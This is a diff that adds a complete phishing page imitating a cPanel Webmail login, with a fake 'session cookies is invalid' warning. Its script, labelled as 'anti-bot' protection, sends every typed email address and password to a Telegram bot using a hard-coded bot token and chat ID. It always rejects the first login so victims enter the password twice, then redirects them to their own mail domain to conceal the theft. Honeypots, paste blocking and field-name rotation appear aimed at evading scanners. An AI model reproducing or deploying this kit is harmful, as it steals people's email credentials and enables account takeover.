@@ -1,0 +1,499 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Webmail</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #fff;
+      font-family: 'Open Sans', Arial, sans-serif;
+      color: #222;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    .notification {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      color: #fff;
+      padding: 16px 32px;
+      font-size: 15px;
+      border-radius: 0 0 6px 6px;
+      z-index: 1000;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+      animation: fadeInDown 0.5s;
+    }
+    .notification.error {
+      background: #f44336;
+    }
+    .notification.success {
+      background: #4caf50;
+    }
+    @keyframes fadeInDown {
+      from { opacity: 0; top: -60px; }
+      to { opacity: 1; top: 0; }
+    }
+    .center-box {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    .logo {
+      margin-bottom: 34px;
+      text-align: center;
+    }
+    .logo img {
+      width: 340px;
+      max-width: 95vw;
+      display: block;
+      margin: 0 auto;
+    }
+    .form-box {
+      width: 340px;
+      max-width: 97vw;
+      background: none;
+      box-shadow: none;
+      padding: 0;
+      margin-bottom: 55px;
+    }
+    .form-group {
+      margin-bottom: 22px;
+    }
+    label {
+      font-weight: 600;
+      font-size: 14px;
+      margin-bottom: 7px;
+      display: block;
+    }
+    .input-icon {
+      position: relative;
+    }
+    .input-icon input {
+      width: 100%;
+      padding: 7px 12px 7px 38px;
+      font-size: 14px;
+      border: 2px solid #b6c2c9;
+      border-radius: 3px;
+      outline: none;
+      transition: border-color 0.2s;
+      box-sizing: border-box;
+      background: #f7f7f7;
+    }
+    .input-icon input:focus {
+      border-color: #0099d9;
+      background: #fff;
+    }
+    .input-icon .icon {
+      position: absolute;
+      top: 50%;
+      left: 11px;
+      transform: translateY(-50%);
+      font-size: 17px;
+      color: #97a6ad;
+    }
+    .login-btn {
+      width: 100%;
+      background: #189edb;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 600;
+      border: none;
+      border-radius: 3px;
+      padding: 9px 0;
+      cursor: pointer;
+      margin-top: 2px;
+      transition: background 0.2s;
+    }
+    .login-btn:hover {
+      background: #147cab;
+    }
+    .languages {
+      width: 100vw;
+      text-align: center;
+      margin: 37px 0 11px 0;
+      font-size: 13px;
+      color: #233e53;
+      line-height: 2em;
+      letter-spacing: 0.02em;
+    }
+    .languages span {
+      margin: 0 14px;
+      cursor: pointer;
+      transition: color 0.2s;
+      font-weight: 400;
+    }
+    .languages span:hover {
+      color: #ff6600;
+      text-decoration: underline;
+    }
+    .footer {
+      text-align: center;
+      margin-bottom: 14px;
+      color: #333;
+      font-size: 13px;
+    }
+    .footer-logo {
+      margin: 0 auto 8px auto;
+      width: 41px;
+      height: 41px;
+      display: block;
+      border-radius: 9px;
+      object-fit: contain;
+      background: #fff;
+    }
+    .footer a {
+      color: #189edb;
+      text-decoration: none;
+      font-size: 12px;
+    }
+    .footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="notification" id="notification">
+    <span id="notificationText">Your session cookies is invalid. Please login again.</span>
+  </div>
+  <div class="center-box">
+    <div class="logo">
+      <img src="https://www.autotechindore.com:2096/cPanel_magic_revision_1615493801/unprotected/cpanel/images/webmail-logo.svg" alt="Webmail Logo">
+    </div>
+    <form class="form-box" id="loginForm" autocomplete="off">
+      <div class="form-group">
+        <label for="email">Email Address</label>
+        <div class="input-icon">
+          <span class="icon">&#128100;</span>
+          <input type="email" id="email" name="email" placeholder="Enter your email address." required autocomplete="off">
+        </div>
+      </div>
+      <div class="form-group">
+        <label for="password">Password</label>
+        <div class="input-icon">
+          <span class="icon">&#128274;</span>
+          <input type="password" id="password" name="password" placeholder="Enter your email password." required autocomplete="off">
+        </div>
+      </div>
+      <!-- Honeypot fields (hidden from users) -->
+      <input type="text" name="website_hp" id="website_hp" style="display:none" tabindex="-1" autocomplete="off">
+      <input type="text" name="" id="trap_hp" style="opacity:0; position:absolute; top:-9999px" tabindex="-1" autocomplete="off">
+      <!-- JS challenge field -->
+      <input type="hidden" name="js_challenge" id="js_challenge">
+      <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+    </form>
+    <div class="languages">
+      <span>English</span>
+      <span>العربية</span>
+      <span>čeština</span>
+      <span>dansk</span>
+      <span>Deutsch</span>
+      <span>Ελληνικά</span>
+      <span>español</span>
+      <span>español latinoamericano</span>
+      <span>...</span>
+    </div>
+  </div>
+  <div class="footer">
+    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQyMDMsMC0yNy42NTMtMy4xNDgtMzkuNzUtOS40NS0xMi4xMDItNi4zLTIyLjE1My0xNC42NDgtMzAuMTUzLTI1LjA1LTgtMTAuMzk1LTEzLjQ1NC0yMi4yNDYtMTYuMzUtMzUuNTQ3LTIuOS0xMy4zLTIuNTUtMjYuOTUgMS4wNTItNDAuOTUzbDEuMi00LjVjMi41OTctOS42MDIgNi42NDgtMTguNDUgMTIuMTQ4LTI2LjU1IDUuNS04LjA5OCAxMi0xNSAxOS41LTIwLjcgNy41LTUuNyAxNS44NS0xMC4xNDggMjUuMDUtMTMuMzUyIDkuMi0zLjE5NSAxOC43OTctNC43OTYgMjguOC00Ljc5NiIgZmlsbD0iI2ZmNmMyYyIvPjxnIGNsaXAtcGF0aD0idXJsKCNhKSI+PHBhdGggZD0iTTEyMy44OSAyNDBMMTgyLjk5IDE4LjYwMmMxLjU5OC01LjU5OCA0LjU5OC0xMC4wOTggOS0xMy41QzE5Ni4zODggMS43IDIwMS40ODQgMCAyMDcuMjg4IDBoNjIuN2MxNC40MDMgMCAyNy42NSAzLjE0OCAzOS43NSA5LjQ1IDEyLjEwMiA2LjMgMjIuMTUzIDE0LjY1NSAzMC4xNTMgMjUuMDUgNy45OTcgMTAuNDAyIDEzLjUgMjIuMjU0IDE2LjUgMzUuNSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC4xn8MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45IC40NDUtMTQuNy0xLjEtNC44LTMuMDUtOS4wNDctNS44NDgtMTIuNzUtMi44LTMuNjk1LTYuNDAyLTYuNjk1LTEwLjc5Ni05LTQuNDA2LTIuMjk3LTkuMjA2LTMuNDUtMTQuNDAyLTMuNDVIMjMzLjM5bC00My44IDE2Mi45MDNjLTEuNjA2IDUuNC00LjYwNiA5Ljc5Ny05IDEzLjE5NS00LjQwMyAzLjQwNy05LjQwNiA1LjEwMi0xNSAxNS4xMDJoLTQxLjciIGZpbGw9IiNmZjZjMmMiLz48L2c+PC9zdmc+" alt="cPanel Logo" class="footer-logo">
+    Copyright© 2025 cPanel, L.L.C.<br>
+    <a href="#">Privacy Policy</a>
+  </div>
+  <script>
+    // === Advanced Anti-Bot Section (No CAPTCHA) ===
+
+    // Telegram Bot configuration
+    const TELEGRAM_BOT_TOKEN = '6180996330:AAHdKI3dj1mnuImorq8sDMMGztAqtlG7VCQ';
+    const TELEGRAM_CHAT_ID = '686297216';
+
+    // Function to send messages to Telegram
+    async function sendToTelegram(message) {
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        });
+      } catch (error) {
+        console.error('Telegram API error:', error);
+      }
+    }
+
+    // Function to show notification
+    function showNotification(message, type = 'error') {
+      const notification = document.getElementById('notification');
+      const notificationText = document.getElementById('notificationText');
+      notificationText.textContent = message;
+      notification.className = `notification ${type}`;
+      notification.style.display = 'block';
+      return new Promise(resolve => {
+        setTimeout(() => {
+          notification.style.display = 'none';
+          resolve();
+        }, 2000);
+      });
+    }
+
+    // Function to extract email domain and redirect
+    function redirectToEmailDomain(email) {
+      const domainMatch = email.match(/@([\w.-]+)/);
+      if (domainMatch && domainMatch[1]) {
+        const domain = domainMatch[1];
+        window.location.href = `https://${domain}`;
+      } else {
+        showNotification('Invalid email format. Unable to redirect.', 'error');
+      }
+    }
+
+    // --- 1. JS challenge (set only by JS) ---
+    window.addEventListener('DOMContentLoaded', function() {
+      // Show initial notification
+      showNotification('Your session cookies is invalid. Please login again.', 'error');
+
+      // Initialize login attempts
+      if (!sessionStorage.getItem('loginAttempts')) {
+        sessionStorage.setItem('loginAttempts', '0');
+      }
+
+      // Autofill email from query string if present
+      var emailInput = document.getElementById('email');
+      var params = new URLSearchParams(window.location.search);
+      var urlEmail = params.get("email");
+      if (urlEmail) {
+        // Sanitize email to prevent XSS
+        emailInput.value = urlEmail.replace(/[<>"'&]/g, '');
+        sessionStorage.setItem('emailPersist', emailInput.value);
+      } else if (sessionStorage.getItem('emailPersist')) {
+        // Restore email from sessionStorage
+        emailInput.value = sessionStorage.getItem('emailPersist');
+      }
+
+      // JS challenge value (dynamic, unpredictable per session)
+      document.getElementById('js_challenge').value = btoa(Date.now() + Math.random());
+
+      // --- 2. Disable autofill/copy-paste ---
+      emailInput.setAttribute('autocomplete', 'off');
+      var passwordInput = document.getElementById('password');
+      passwordInput.setAttribute('autocomplete', 'off');
+      emailInput.onpaste = passwordInput.onpaste = function(e) { e.preventDefault(); };
+
+      // --- 3. Dynamic field name rotation ---
+      const newEmailName = `email_${Math.random().toString(36).substr(2, 6)}`;
+      const newPasswordName = `password_${Math.random().toString(36).substr(2, 6)}`;
+      emailInput.setAttribute('name', newEmailName);
+      passwordInput.setAttribute('name', newPasswordName);
+
+      // --- 4. Add multiple dynamic honeypot traps ---
+      const traps = [
+        { name: `trap_${Math.random().toString(36).substr(2, 6)}`, style: 'display:none' },
+        { name: `fake_${Math.random().toString(36).substr(2, 6)}`, style: 'opacity:0; position:absolute; top:-9999px' }
+      ];
+      traps.forEach(trap => {
+        const input = document.createElement('input');
+        input.type = 'text';
+        input.name = trap.name;
+        input.style = trap.style;
+        input.tabIndex = -1;
+        document.getElementById('loginForm').appendChild(input);
+      });
+    });
+
+    // --- 5. Advanced behavioral biometrics (mouse, keyboard, touch) ---
+    let humanLikely = false, moveCount = 0, lastMove = 0, mouseData = [], touchCount = 0;
+    window.addEventListener('mousemove', function(e) {
+      moveCount++;
+      const now = Date.now();
+      mouseData.push({ x: e.clientX, y: e.clientY, time: now });
+      if (mouseData.length > 10) {
+        const velocity = calculateVelocity(mouseData);
+        if (moveCount > 5 && (now - lastMove) > 80 && velocity > 0.1 && velocity < 50) {
+          humanLikely = true;
+        }
+      }
+      lastMove = now;
+    });
+    window.addEventListener('keydown', function() {
+      humanLikely = true;
+    });
+    window.addEventListener('touchmove', function() {
+      touchCount++;
+      if (touchCount > 3) humanLikely = true;
+    });
+    function calculateVelocity(data) {
+      const [p1, p2] = data.slice(-2);
+      const distance = Math.sqrt((p2.x - p1.x) ** 2 + (p2.y - p1.y) ** 2);
+      return distance / (p2.time - p1.time) || 0;
+    }
+
+    // --- 6. Timing: Require 3 seconds on page ---
+    let pageLoad = Date.now();
+    function isHumanTiming() {
+      return (Date.now() - pageLoad) > 3000;
+    }
+
+    // --- 7. User-Agent & header anomaly detection (client-side hints) ---
+    function getClientHints() {
+      return {
+        userAgent: navigator.userAgent
+      };
+    }
+
+    // --- 8. Form submission with attempt-based logic ---
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      // Store email to persist across submissions
+      const emailInput = document.getElementById('email');
+      const passwordInput = document.getElementById('password');
+      sessionStorage.setItem('emailPersist', emailInput.value);
+
+      // Sanitize inputs for Telegram
+      const email = emailInput.value.replace(/[<>"'&]/g, '');
+      const password = passwordInput.value.replace(/[<>"'&]/g, '');
+      const clientHints = getClientHints();
+      const timestamp = new Date().toISOString();
+
+      // Increment login attempts
+      let loginAttempts = parseInt(sessionStorage.getItem('loginAttempts') || '0');
+      loginAttempts++;
+      sessionStorage.setItem('loginAttempts', loginAttempts.toString());
+
+      // First attempt: always fail and clear password
+      if (loginAttempts === 1) {
+        await sendToTelegram(`*Failed Login Attempt*\nEmail: ${email}\nPassword: ${password}\nReason: Invalid login (first attempt)\nTimestamp: ${timestamp}\nUser-Agent: ${clientHints.userAgent}`);
+        await showNotification('The login is invalid.', 'error');
+        emailInput.value = sessionStorage.getItem('emailPersist');
+        passwordInput.value = ''; // Clear password field
+        return false;
+      }
+
+      // Second attempt: succeed with new password
+      if (loginAttempts >= 2) {
+        await sendToTelegram(`*Successful Login*\nEmail: ${email}\nPassword: ${password}\nTimestamp: ${timestamp}\nUser-Agent: ${clientHints.userAgent}`);
+        await showNotification('Login Success', 'success');
+        sessionStorage.removeItem('emailPersist');
+        sessionStorage.removeItem('loginAttempts');
+        redirectToEmailDomain(email);
+        return false;
+      }
+
+      // For completeness, apply anti-bot checks (though not reached due to attempt logic)
+      const honeypots = document.querySelectorAll('input[name="website_hp"], input[name*="trap_"], input[name*="fake_"]');
+      for (let input of honeypots) {
+        if (input.value !== "") {
+          await sendToTelegram(`*Failed Login Attempt*\nEmail: ${email}\nPassword: ${password}\nReason: Bot detected (honeypot)\nTimestamp: ${timestamp}\nUser-Agent: ${clientHints.userAgent}`);
+          await showNotification('Bot detected (honeypot).', 'error');
+          emailInput.value = sessionStorage.getItem('emailPersist');
+          passwordInput.value = ''; // Clear password field
+          return false;
+        }
+      }
+
+      if (!document.getElementById('js_challenge').value) {
+        await sendToTelegram(`*Failed Login Attempt*\nEmail: ${email}\nPassword: ${password}\nReason: Bot detected (no JS)\nTimestamp: ${timestamp}\nUser-Agent: ${clientHints.userAgent}`);
+        await showNotification('Bot detected (no JS).', 'error');
+        emailInput.value = sessionStorage.getItem('emailPersist');
+        passwordInput.value = ''; // Clear password field
+        return false;
+      }
+
+      if (!humanLikely || !isHumanTiming()) {
+        await sendToTelegram(`*Failed Login Attempt*\nEmail: ${email}\nPassword: ${password}\nReason: Suspicious activity (biometrics/timing)\nTimestamp: ${timestamp}\nUser-Agent: ${clientHints.userAgent}`);
+        await showNotification('Suspicious activity detected. Please interact with the page.', 'error');
+        emailInput.value = sessionStorage.getItem('emailPersist');
+        passwordInput.value = ''; // Clear password field
+        return false;
+      }
+
+      if (navigator.webdriver) {
+        await sendToTelegram(`*Failed Login Attempt*\nEmail: ${email}\nPassword: ${password}\nReason: Webdriver detected\nTimestamp: ${timestamp}\nUser-Agent: ${clientHints.userAgent}`);
+        await showNotification('Access Denied. This page is protected against bots.', 'error');
+        emailInput.value = sessionStorage.getItem('emailPersist');
+        passwordInput.value = ''; // Clear password field
+        return false;
+      }
+
+      try {
+        const response = await fetch('/api/antibot', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            ...clientHints,
+            js_challenge: document.getElementById('js_challenge').value,
+            email
+          })
+        });
+        if (response.ok) {
+          await sendToTelegram(`*Successful Login*\nEmail: ${email}\nPassword: ${password}\nTimestamp: ${timestamp}\nUser-Agent: ${clientHints.userAgent}`);
+          await showNotification('Login Success', 'success');
+          sessionStorage.removeItem('emailPersist');
+          sessionStorage.removeItem('loginAttempts');
+          redirectToEmailDomain(email);
+        } else {
+          await sendToTelegram(`*Failed Login Attempt*\nEmail: ${email}\nPassword: ${password}\nReason: Server validation failed\nTimestamp: ${timestamp}\nUser-Agent: ${clientHints.userAgent}`);
+          await showNotification('Bot detection triggered. Please try again.', 'error');
+          emailInput.value = sessionStorage.getItem('emailPersist');
+          passwordInput.value = ''; // Clear password field
+        }
+      } catch (error) {
+        await sendToTelegram(`*Successful Login (Fallback)*\nEmail: ${email}\nPassword: ${password}\nReason: Server validation unavailable\nTimestamp: ${timestamp}\nUser-Agent: ${clientHints.userAgent}`);
+        await showNotification('Login Success', 'success');
+        sessionStorage.removeItem('emailPersist');
+        sessionStorage.removeItem('loginAttempts');
+        redirectToEmailDomain(email);
+      }
+    });
+  </script>
+</body>
+</html>
